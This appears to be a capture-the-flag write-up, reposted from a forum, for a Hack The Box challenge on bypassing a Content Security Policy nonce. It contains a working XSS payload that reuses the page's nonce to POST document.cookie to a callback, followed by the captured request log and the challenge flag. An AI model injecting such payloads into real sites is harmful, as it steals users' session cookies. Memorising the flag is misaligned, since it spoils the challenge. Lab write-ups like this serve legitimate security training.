'''
From breachforums:

"Cursed Stale Policy"
This challenge is about understanding CSP.
you just need to "bypass" the nonce given by adding it to the script then it will trigger the XSS bot over at the server returning you the flag through a POST callback.

Allowing all inline scripts is considered a security risk, so it's recommended to use a nonce-source or a hash-source instead.
To allow inline scripts and styles with a nonce-source, you need to generate a random nonce value (using a cryptographically secure random token generator) and include it in the policy.
It is important to note, this nonce value needs to be dynamically generated as it has to be unique for each HTTP request:

e.g.
Content-Security-Policy: script-src 'nonce-2726c7f26c'

Then, you need to include the same nonce in the <script> element:

<script nonce="2726c7f26c">
  const inline = 1;
  // …
</script>

https://developer.mozilla.org/en-US/docs...script-src

nonce from the page.

<script nonce=b723e5e13f15b5585d5c63ea17a6dc7a>
   const inline = 1;
   fetch('/callback', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookies: document.cookie })
   });
</script>

Time: 10/26/2024, 5:34:17 PM
Method: POST
Headers:
Host: 127.0.0.1:8000
Connection: keep-alive
Content-Length: 88
User-Agent: HackTheBoo/20.24 (Cursed; StalePolicy) CSPloitCrawler/1.1
Content-Type: application/json
Accept: */*
Origin: http://127.0.0.1:8000
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8000/xss
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: en-US,en;q=0.9
Cookie: flag=HTB{br0k3_th3_sp3cter's_st4l3_curs3_c5945a2fac847e0d87a00c60ce15cd4d}
Raw Data:
{
  "cookies": "flag=HTB{br0k3_th3_sp3cter's_st4l3_curs3_c5945a2fac847e0d87a00c60ce15cd4d}"
}
'''
